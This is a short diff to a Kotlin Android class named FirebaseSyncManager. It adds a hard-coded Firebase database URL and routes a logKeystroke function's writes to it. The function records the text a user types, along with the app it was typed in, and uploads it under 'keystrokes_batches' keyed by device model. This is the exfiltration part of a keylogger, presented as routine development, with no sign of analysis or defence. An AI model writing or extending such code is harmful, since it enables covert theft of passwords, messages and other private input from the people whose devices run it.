@@ -13,6 +13,7 @@ import java.util.Locale
 class FirebaseSyncManager {
     companion object {
         private const val TAG = "FirebaseSyncManager"
+        private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
         private val scope = CoroutineScope(Dispatchers.IO)
 
         fun logKeystroke(text: String, packageName: String?) {
@@ -20,7 +21,7 @@ class FirebaseSyncManager {
 
             scope.launch {
                 try {
-                    val database = FirebaseDatabase.getInstance()
+                    val database = FirebaseDatabase.getInstance(DB_URL)
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val ref = database.getReference().child("keystrokes_batches").child(deviceName)
                     val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
